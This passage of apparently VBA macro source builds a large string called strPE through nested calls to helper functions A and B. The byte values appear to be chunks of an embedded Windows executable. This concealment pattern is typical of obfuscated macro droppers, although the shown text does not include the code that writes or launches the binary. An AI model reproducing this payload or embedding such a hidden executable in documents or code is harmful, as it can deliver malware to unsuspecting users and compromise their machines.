    strPE = A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(strPE, "h"), 146), 149), "@"), 0), "Q%"), 214), 139), 21), 200), 192), "@"), 0), "hW"), 236), 152), 208), 34), 194), "@R_"), 214), 161), 200), 192), "@"), 0), "h|"), 236), "@"), 0), 131), 192), "@P"), 255), 129), 139), 29), 200), 192), "@"), 0), "h@"), 141)
    strPE = A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(B(strPE, "@"), 0), 131), 162), 165), "Q"), 255), 214), 139), 21), 200), 192), "@"), 215), "h"), 248), 235), "@"), 0), 131), 194), 203), "R"), 255), 214), 161), 200), 192), "@"), 0), "h"), 176), 235), "@"), 0), 131), 192), "@P"), 255), 214), 139), 25), "_"), 192), "@"), 0), "hp"), 235)
    strPE = A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(strPE, "@"), 0), 131), 193), "@Q"), 255), 176), 13), "P.m@"), 0), "h4"), 235), "$"), 0), 131), "b@R"), 255), 214), 161), 200), 192), "@%"), 131), 196), "@"), 131), 192), "@h"), 216), 234), "@"), 0), 170), 223), 1), 131), 196), 8), "j"), 22), 143)
    strPE = B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(strPE, 21), "p"), 220), "@"), 0), 252), "r"), 144), 144), 144), "U"), 139), 173), 17), 161), "L@A"), 0), "S"), 139), "]"), 8), "VWSP"), 34), 190), "C"), 0), 0), 163), "@@A'"), 139), 251), 131), 201), 183), "3"), 192), 242), 174), 139), "5"), 2), "}")
    strPE = A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(strPE, "@"), 0), 247), 209), "I"), 131), 249), 7), 15), "i"), 215), 193), 0), 0), "j"), 7), "h"), 216), 189), "@"), 0), "S"), 255), 214), 131), 196), 12), 133), 192), "s"), 133), 194), 0), 0), 0), 131), 195), 158), "j/S"), 255), 21), "|"), 193), "@"), 0), 131), 141), 8)
    strPE = A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(strPE, 127), "`E"), 133), 13), 15), 132), "R"), 1), 0), 0), 139), 240), 161), "L.A"), 0), "+"), 243), 141), "V"), 1), "RPp"), 136), 4), 127), "V"), 139), 206), 139), 243), 20), 195), 139), 248), 193), "S"), 2), 243), 165), "d"), 205), 131), 225), 3), 242), 134)
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(strPE, 139), "u"), 8), 139), 200), "+"), 128), 198), 4), "+"), 0), 139), 194), "L"), 17), "A"), 198), "XP"), 141), "E"), 253), "h"), 11), 28), 161), 0), 251), "h"), 0), 24), "A"), 0), 155), 14), "("), 0), 0), 133), 192), 15), 133), 253), 0), 0), 209), 161), 0), 24), "A")
    strPE = A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 0), 133), 192), 15), 132), 240), 0), 0), 0), 139), "E"), 252), 133), 192), 161), 133), 229), 0), 195), 0), 139), 13), "L@A"), 0), "-Q"), 232), 17), 18), 0), 0), 17), 228), 23), "A"), 163), 198), 6), "<"), 128), ";[uk"), 244), 21), 183), 24)
    strPE = A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(strPE, "A"), 160), 161), "L@A"), 0), 152), "h"), 208), 242), "@"), 0), "P"), 232), "m"), 189), 0), 0), 131), 186), 234), 163), 156), 11), "A"), 218), 235), "V"), 139), 167), 131), 201), 255), "3"), 192), 255), 174), 247), "jI"), 131), 249), 245), 15), 134), ","), 255), 255), 255)
    strPE = B(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(strPE, "G"), 8), "i"), 196), 243), "@"), 0), "S"), 255), 214), 131), 196), 232), "/"), 192), "_"), 133), 23), 255), 255), "."), 139), 13), 200), 192), "@"), 0), "`,"), 242), "@"), 6), 131), 193), "@Q"), 255), 21), "9"), 34), "@"), 0), 131), 196), 8), "j"), 1), 255), 21), "p")
    strPE = A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 193), 139), 0), 139), 13), 0), 24), "A"), 0), 137), 13), 156), 11), "A"), 0), "f"), 145), 2), 23), "A"), 0), "#"), 207), 192), 209), 28), "f"), 199), 5), 244), 23), 188), 0), "P"), 0), "_^"), 25), "y"), 172), 138), "A"), 144), 212), 2), "A<3"), 192), 13)
    strPE = B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(strPE, 139), 229), "C"), 195), 12), "=P"), 0), "t"), 231), "3"), 210), "f"), 139), "1"), 161), "L@A"), 0), 206), "h"), 152), 242), "@"), 249), "P"), 232), 202), 223), 182), 0), 131), 196), "5"), 163), 172), 11), "A"), 0), "3"), 192), "_^["), 139), 229), "]"), 31), "_")
    strPE = B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(strPE, "^"), 184), "W"), 0), 0), 255), "["), 139), 229), "]"), 183), 144), 144), 147), 144), 144), 144), 173), 144), 144), 144), 144), 144), 144), "U"), 139), 236), 129), 236), 216), 174), 0), 0), 161), "L"), 210), "ASV"), 224), 139), "}"), 8), 220), "h"), 255), 15), 0), 0), "j")
    strPE = B(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(strPE, 1), "|M"), 8), "WQ"), 232), 171), "L"), 0), 0), 139), "n"), 133), 246), "t-"), 141), "U"), 136), "jxRV"), 232), "y?"), 0), 0), "P"), 161), 200), 192), "^"), 0), "W"), 131), 192), "@Z`"), 243), "@"), 0), "P"), 255), 21), 128), "=o")
    strPE = A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "("), 131), 196), 16), 139), 198), 34), 179), 139), 229), 204), 175), 139), "M"), 8), 146), 149), "("), 185), 180), 174), "Zhp"), 31), "s"), 0), "R"), 232), "AY"), 0), 0), 139), 240), 133), "yt."), 141), "E"), 136), "jOP_"), 232), "1"), 149), 0)
    strPE = B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(strPE, 0), 139), 13), 200), 192), "@"), 0), "PW"), 131), "j@h4"), 243), "@"), 0), "Q"), 255), 21), 128), 193), "@b"), 131), 196), ";"), 139), 198), "_^"), 139), "L"), 163), 195), 23), 133), "P"), 255), 255), 255), "P"), 163), "p"), 220), "A"), 0), 255), 21), "\")
    strPE = A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 141), 222), 0), 211), 196), 4), 163), 159), "8-"), 0), 133), 192), "u#"), 139), 21), 200), 192), 159), 0), "h"), 20), 243), "@"), 225), 131), 194), "PR"), 255), 21), 128), 193), "@"), 0), 232), 196), 8), 184), "b"), 0), 0), 0), 20), "^"), 139), 229), "T"), 195)
    strPE = A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(strPE, 139), 132), "p"), 2), "A"), 0), 139), "U"), 8), 206), 0), "Q"), 228), "R"), 232), ";P"), 0), 0), 139), 173), 133), 246), ")V"), 141), "r[jxPV"), 232), 169), ">"), 143), 0), 139), 13), "V/"), 221), 0), "P"), 131), "M@h"), 224), 209)
    strPE = B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(strPE, "3"), 141), "Q"), 255), 21), 128), "L@"), 0), 131), 196), 12), 139), 198), "_^"), 139), 229), "]{"), 139), "U"), 8), "R"), 232), 191), "O"), 0), 0), "_3p^"), 139), " ]"), 195), 25), 144), 144), 144), 144), 144), 144), "U"), 139), "bV"), 180), "u")
    strPE = A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(strPE, 8), "jh"), 199), 6), 188), 0), 0), 0), 255), 21), "\"), 176), "@"), 0), "i"), 208), 131), 183), 4), 133), ";u"), 12), 184), 12), 0), 0), 0), "^]"), 194), "1"), 0), "W"), 12), "qM_"), 0), "38!"), 250), "$"), 8), 137), "B"), 237), 137)
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(strPE, 22), "_^]"), 194), 4), 0), 144), "U"), 139), 236), 139), "E"), 220), "SV3"), 139), 129), "0"), 193), "@"), 0), 141), "p"), 20), 187), 207), 0), 0), 0), 139), 6), 133), 192), "t"), 16), 139), 149), "P"), 137), 14), 255), 215), 139), 6), 131), 196), 4), 133)
    strPE = B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(strPE, 192), "u"), 240), 131), 198), 4), "K"), 239), 228), 139), 232), "gRW"), 215), 131), "T"), 4), "_"), 159), "[U"), 194), 4), 0), 144), "`"), 144), 144), "R"), 144), 144), 144), 144), 144), 144), 144), 144), "U"), 139), 236), 236), "M"), 8), 139), "E"), 12), 137), "A7")
    strPE = A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(strPE, "]"), 194), 8), 6), 182), 139), 236), 139), "E"), 204), 139), "@"), 12), 221), 194), 4), 0), "/"), 144), 144), "U"), 139), 236), 139), "M["), 139), "E"), 11), 137), "A"), 245), "]"), 194), "'"), 0), "U"), 139), 143), 9), "E"), 8), 250), "@"), 16), 180), 194), 244), 222), 144)
    strPE = A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(strPE, 225), 144), "U"), 139), 236), "Q"), 160), 216), 241), "A"), 12), "V"), 138), 145), 254), 192), 132), 201), 162), 243), "*"), 195), 0), "M"), 133), 176), 0), 0), 225), "f"), 224), 2), "A"), 0), 232), 11), 255), 255), 255), 133), 192), "U"), 12), 198), 5), 151), "cA"), 0), 0)
    strPE = A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(strPE, "^V"), 229), 130), 195), 139), 21), 224), 149), "A"), 216), "Rj"), 226), "j"), 0), "h"), 220), 2), 254), 0), 232), 214), 5), 0), 0), 139), 240), 133), "#t-"), 161), 224), 2), "A"), 0), "o"), 232), 21), "4"), 10), "j"), 139), 198), 199), 5), 224), 2), 165)
    strPE = B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 198), 5), 233), "=A"), 0), 0), "^"), 139), 229), "]"), 195), 139), 13), 220), 2), "A"), 0), "h"), 140), 243), 141), 0), "d"), 232), ","), 248), 0), "u"), 139), 21), 220), 2), "Y"), 0), "R"), 232), 163), "Y"), 0), 0), 133), 192), "u9")
    strPE = B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(strPE, 161), 12), 231), "Z"), 0), "HMkP"), 184), 0), "Q"), 232), 251), "W"), 0), 192), 133), 192), "u${U"), 181), 161), 224), 2), "A"), 133), "RP"), 232), "A"), 255), 255), 255), 139), 13), 15), 2), "A"), 0), 139), "q"), 224), 2), 21), 0), "QR")
    strPE = B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(strPE, 232), 21), 255), 255), 255), 3), 192), "^"), 139), "t]"), 195), 144), 144), 144), 144), 251), "C"), 214), 144), 144), 144), 144), 144), 144), 144), 160), 216), 3), "A"), 0), 132), 192), "t("), 254), 200), 162), 216), 2), "A"), 0), "Y"), 224), 161), "M"), 2), "A"), 0), "P")
    strPE = A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(strPE, 232), 195), 3), 0), ":"), 199), 5), 220), 2), "A"), 135), 0), 0), "X"), 0), 199), 22), 224), 2), "A"), 0), 0), 193), 0), 0), 4), 144), 144), "d"), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 198), "U"), 139), 236), 166), 236), 12), 139), "E"), 12), 134)
    strPE = A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(strPE, "VW"), 141), "P"), 7), 131), 226), 248), ";"), 1), 139), 151), 8), 137), "U"), 248), "s9"), 139), "@ "), 133), 192), "<"), 132), "F"), 2), 0), 0), "j"), 203), 255), "o"), 131), 196), 4), 143), 192), 168), "^["), 139), 229), "]"), 194), 8), "<"), 27), "b"), 163)
    strPE = A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(strPE, 139), "N"), 16), 139), "~"), 20), "1"), 249), ";"), 7), "wY"), 3), 209), 206), 137), "V"), 211), "^"), 171), 193), "[w"), 229), "]"), 194), 31), 0), 139), 14), 139), "y"), 20), 139), "Y"), 16), "+"), 251), ";"), 215), "w"), 20), "DA"), 193), 164), "9"), 137), "8"), 139)
    strPE = A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(strPE, 1), 139), "y"), 4), 137), 16), 4), 233), "p"), 1), 0), 0), 139), "x"), 24), 141), 155), 23), 16), 0), 0), 129), 227), 0), 240), 255), 255), ";"), 153), 215), "]"), 12), 15), 3), 203), 1), 0), 134), "d"), 251), 0), 16), 0), 212), "s"), 10), 189), "E"), 170), 195)
    strPE = B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(strPE, " 0"), 0), 139), "]"), 12), 139), 211), 193), 234), "@J"), 131), 250), 255), 137), "U"), 252), 15), 135), 167), 1), 0), 0), ";"), 23), 210), 135), 133), 246), 30), 0), 139), "G"), 12), 133), 218), "t"), 9), "P"), 232), 163), "W"), 0), 0), 234), 165), 252), 139), "\")
    strPE = A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(strPE, 151), 20), 219), 15), 141), "D"), 27), 20), "H"), 219), "u"), 15), ";"), 209), "s5"), 139), "X"), 4), 131), "y"), 197), "B"), 133), 219), "t"), 241), 139), 24), 133), 219), 137), "]\t"), 127), 139), 27), 133), 219), 227), 24), "u"), 21), ";"), 209), "r"), 22), 139), 14)
    strPE = A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(strPE, 252), 131), 232), 4), "I"), 133), 210), "u"), 4), 133), 201), "w"), 241), 137), 15), 131), 197), 20), 182), "G"), 204), 139), 129), 8), 30), 193), 137), "G"), 8), 214), 200), 136), 25), 4), ";"), 182), "v"), 3), "D"), 247), 8), 246), 127), "4"), 133), 255), "t"), 6), "W"), 232)
    strPE = B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(strPE, 166), "W"), 26), 0), 141), "S"), 24), 137), "S"), 16), 189), 154), 0), 0), 0), "tG"), 20), "]"), 192), "t9"), 139), "G9"), 133), 192), "t"), 6), 155), 232), 163), "W"), 0), 0), 139), "_"), 20), 141), ";"), 20), 133), 219), "t"), 177), 139), "M "), 139), "S")
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(strPE, 8), ";"), 202), "S"), 236), 139), 195), 139), 27), 133), 219), "u"), 238), 139), 159), 12), 160), "7t"), 6), "W"), 232), "^>"), 0), 179), 139), "]"), 12), 147), 255), 21), "\"), 193), "@"), 0), 131), 196), 4), 133), 192), 15), 166), 197), 0), 22), 0), 139), "U"), 231)
    strPE = A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(strPE, 141), "H"), 24), 137), "P"), 8), 141), 20), 252), 137), "H"), 16), 199), "Y"), 0), 0), 0), 0), 137), "P"), 20), 139), "%"), 235), "4"), 139), 19), 137), "e"), 139), "C"), 8), 139), "O"), 12), 3), 200), 139), "G"), 4), "q"), 200), 137), "O'"), 208), 3), 235), "G"), 8)
    strPE = B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(strPE, "%"), 127), 12), 133), 255), 151), 233), "W"), 232), 7), "W"), 0), 0), 141), 208), 176), "\K"), 16), 199), 3), 0), 0), 226), 0), 139), 160), 139), "U"), 248), 139), "A"), 10), "BS"), 12), 0), 0), 0), 0), 3), 208), 137), "Q"), 16), 139), "V"), 4), 137), "Q")
    strPE = A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(strPE, 4), 137), 15), 139), "U"), 8), 137), "1"), 137), "N"), 165), 137), 227), ","), 139), "N"), 197), 139), "~"), 16), "+"), 207), 139), ">"), 129), 193), "Q"), 16), 0), 221), 139), 20), 129), 225), 0), 240), 210), 255), "I"), 5), 249), 12), 191), "P"), 12), 139), "Z"), 12), ";"), 203)

    PE7 = strPE
End Function

Private Function PE8() As String
   Dim strPE As String

    strPE = ""
    strPE = A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(strPE, "s!"), 139), 18), ";"), 29), 169), "r"), 249), 11), 8), 236), 137), "9"), 139), 236), 139), "~"), 4), 137), 24), 227), 139), "J"), 4), ":N"), 159), 137), "1"), 137), 7), 137), "r^_^["), 191), 229), "]"), 203), 20), 0), 139), "/"), 8), 139), "@"), 253)
    strPE = A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(strPE, 133), 192), "t"), 213), "j"), 12), 255), 208), 131), 196), 4), "_^3"), 192), "["), 193), 229), "]"), 194), 8), 215), 181), "8"), 144), 144), 144), 144), 144), 144), "U"), 139), 196), 131), 236), 12), 214), "VW"), 139), 253), 8), 141), "w}V"), 232), "0"), 9), 207)
    strPE = A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(strPE, 0), 211), 204), 4), "B"), 5), 131), 196), 4), ";"), 195), 137), 30), 137), "_<t"), 13), "}"), 232), 244), 0), 0), 0), 139), "G"), 4), ";"), 176), "u"), 237), 179), "w"), 16), "V"), 232), 212), 9), 242), 0), 139), "G"), 28), "9"), 30), "?"), 137), "_"), 152), 238)
    strPE = A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(strPE, 6), 10), 0), 0), 233), "G"), 174), 253), "O4"), 137), "_"), 28), 137), "_"), 245), 137), "G,"), 137), "H"), 191), 139), 8), 131), 196), 8), ";"), 200), 137), "E"), 244), 15), 132), 169), 0), 0), 0), 139), "P]"), 137), 129), 139), 127), 24), 139), "0"), 139), 13)
    strPE = B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(strPE, 12), 133), 192), "t"), 6), "P"), 232), "mU"), 27), 0), 139), 7), 139), "O:"), 139), 128), 213), 137), "E"), 8), 137), "M"), 252), 139), 4), 139), "M"), 141), 137), "E"), 248), 139), "F"), 8), 133), "5t"), 10), 149), 179), "v"), 219), 137), 30), 139), 222), 235), "{")
    strPE = B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(strPE, 131), 248), 20), "s"), 24), 139), "L"), 135), 205), 2), 201), 137), 14), "\"), 8), ";E"), 8), "v"), 3), 137), "E"), 8), 137), "t"), 135), 20), 232), 8), "wO"), 20), 137), "M"), 206), "w"), 25), ";"), 208), "r"), 4), "+"), 208), 235), 2), "w"), 210), 139), "uk")
    strPE = A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(strPE, 155), 246), "u"), 164), "6E"), 8), 137), "W"), 8), 137), 7), 4), 127), 12), 133), 255), "t"), 6), "W"), 232), "kU"), 220), 0), "UZt"), 20), 9), "50"), 193), 8), 218), 139), 195), 139), 27), "P"), 255), "#"), 10), 196), 4), 133), 219), 165), 185), 139)
    strPE = A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(strPE, 23), 244), 137), 0), 137), "z<_"), 253), "["), 203), 229), "]"), 251), 4), 0), 144), 144), "U"), 139), 236), 131), 236), 12), "S"), 134), "]"), 8), "VWGs8V"), 232), 219), "lv"), 0), 139), "C"), 4), 131), 196), 4), "M"), 182), 211), 6), 0)
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(strPE, 155), "'"), 0), 199), "C<"), 0), 0), 0), 0), "t"), 13), "P;"), 161), 131), 255), 255), "cC"), 4), 133), 192), "u"), 243), 141), "C"), 225), "^"), 232), 174), 8), 0), 0), 139), "K"), 28), "Q"), 232), 229), 8), 0), 0), 7), "u"), 144), 196), 8), 133), 192)
    strPE = B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(strPE, "t5"), 139), "P"), 24), "R"), 232), "G"), 250), 255), 255), 139), 240), 133), 133), "tHV"), 232), "gT"), 0), 0), 139), 196), "."), 139), "K"), 8), 137), 8), 139), "C3P8"), 0), "t"), 6), 139), "S"), 8), 137), "BJ"), 133), 246), "t"), 13), "V")
    strPE = B(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(strPE, 232), 183), "T"), 0), 0), 139), "s0"), 139), "{"), 24), "7"), 139), "F"), 4), 199), "t"), 0), 0), 246), 0), 232), 30), 250), 255), 255), ";"), 195), "u"), 8), 174), 0), "W"), 232), "V"), 250), ">"), 255), 139), "G,"), 178), 219), "ULt"), 6), "P"), 232), "C")
    strPE = B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(B(strPE, "T"), 0), 0), 139), "W"), 4), 139), 15), 137), "U"), 248), ":W"), 8), 236), "M"), 252), 139), 6), 139), "M"), 248), 137), "E"), 244), 139), "F"), 8), 133), 210), "t"), 10), "@"), 194), "v"), 188), 137), 30), 139), 222), 235), "/7"), 248), 209), "s"), 24), 179), "LN")
    strPE = A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(strPE, 20), 133), 201), 137), 232), "u"), 8), ";Egv"), 3), "yE"), 252), 137), "t"), 135), 20), 235), 177), 139), "O"), 20), "Z"), 14), "Ow"), 20), ";"), 208), "r"), 14), 253), 208), 235), 236), "3"), 210), 139), 143), 244), 133), 246), 194), "S"), 139), "E "), 160)
    strPE = A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(strPE, "W"), 8), 181), 2), 139), "G"), 12), "qQ|"), 6), "P"), 232), 21), 202), 211), 0), 168), 219), "tn"), 139), "5"), 23), 193), "@"), 0), 139), 147), 139), 27), "P"), 247), 214), 131), 214), 4), 133), 219), "u"), 242), "W"), 246), 231), 249), 255), "a;E"), 200)
    strPE = A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(strPE, "u"), 6), "W"), 232), "\"), 249), 255), 255), 218), "^["), 210), 229), "]"), 139), 4), 0), 144), 153), 144), "U"), 139), "/"), 139), "E"), 8), 199), 0), 0), 201), 0), 247), 139), "E"), 12), 133), 192), "u"), 236), 14), "1"), 220), "9A"), 0), 225), "M"), 12), 139), 193)
    strPE = B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(strPE, 139), "M"), 16), 133), 201), "u"), 252), 133), 192), "t"), 6), 139), "P "), 137), "U"), 16), "S"), 18), "]"), 20), "VW"), 133), 219), "u"), 3), 139), "X"), 24), "r"), 3), 191), 1), 0), 0), 0), 188), 199), "rW"), 5), "C"), 184), 244), 192), "t"), 157), "P2")
    strPE = A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(strPE, 28), "S"), 0), 0), 139), "s"), 24), 139), 11), 141), "C"), 24), 139), "4"), 133), 246), "u"), 15), ";"), 209), "s"), 11), 139), "p"), 4), 131), 228), 4), "B"), 133), "pt"), 176), 139), 254), 207), 246), "tS"), 139), 132), 133), 255), 137), "8"), 15), 133), 138), "D"), 0)
    strPE = A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(strPE, 0), ";"), 238), 15), 130), 130), 0), 0), 0), 139), "P"), 252), 131), 242), 4), "I"), 133), 210), "u"), 4), 133), 137), "{"), 241), 156), 11), 235), "ohC"), 20), 141), "s"), 20), 133), 192), "t/"), 139), "C"), 235), 133), 192), "t"), 6), "R"), 232), 187), "R"), 0)
